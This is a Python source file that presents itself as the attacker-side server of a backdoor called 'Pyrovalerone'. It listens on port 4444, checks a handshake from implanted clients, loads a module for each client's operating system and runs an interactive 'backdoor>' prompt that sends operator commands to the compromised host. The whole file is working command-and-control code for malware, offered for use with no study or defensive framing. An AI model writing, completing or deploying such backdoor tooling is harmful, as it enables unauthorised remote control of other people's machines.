"""
    Pyrovalerone
    Backdoor TCP Server (Attacker side)
    Note: Currently synchronous, single-client 
"""
import os
import sys
import socket
import shlex
from BDFramework import BDFramework
from BDProtocol import BDProtocol

class BDServer:

	def __init__(self, SRVHOST:str="0.0.0.0", SRVPORT:int=4444, verbose:bool=False):

		self.SRVHOST = SRVHOST
		self.SRVPORT = SRVPORT

		self.framework = BDFramework()

		self.verbose = verbose
		self.log = []

		# Create server socket
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP I/O

		# Allow reuse of the adress and port
		self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	def listen(self):

		try:

			# Bind port and address to socket
			self.s.bind((self.SRVHOST, self.SRVPORT)) 

			# Start listening for incoming connections
			self.s.listen(4)

			if self.verbose:
				print("Listening on %s:%d" % (self.SRVHOST, self.SRVPORT))

		except Exception as exc:
			print("Failed to bind and listen: {}".format(str(exc)))

		# Enter lobby loop
		while True:

			if self.verbose:
				print("[*] Waiting for clients to connect...")

			# Wait for connection
			conn, addr = self.s.accept()

			bdtcp = BDProtocol(conn) # Create backdoor protocol layer

			# Wait for handshake
			msg = bdtcp.recv_msg()

			# If invalid hanshake is received close the connection
			if msg != 'BD_HSK':
				print("Received invalid handshake")
				conn.close()
				continue
			
			# Get the client's OS
			platform = bdtcp.recv_msg() # Eg: Windows

			if self.verbose:
				print("Client OS: %s" % platform)

			# Get module for client platform
			coremodule, platform = self.framework.GetCoreModule(platform=platform)

			# Get Server Main Block
			handler = coremodule.ServerMain(bdtcp)

			# While connected
			while handler.conn:
				
				# Ask user input
				cmdline = input("backdoor> ")
				args = []

				if not cmdline:
					continue

				try:
					# Interpret cmdline into arguments array
					args = shlex.split(cmdline)
				
				except Exception as exc:
					# Failed interpreting
					print("Shell lexer[Syntax error]: {}".format(cmdline))
					continue
				
				# Run the command
				result = handler.runCMD(args)

				# Show help page if needed
				if result == "INVALID_ARGUMENT":
					result = handler.runCMD(["help", args[0]])

				if self.verbose:
					print(result)

server = BDServer(verbose=True)
server.listen()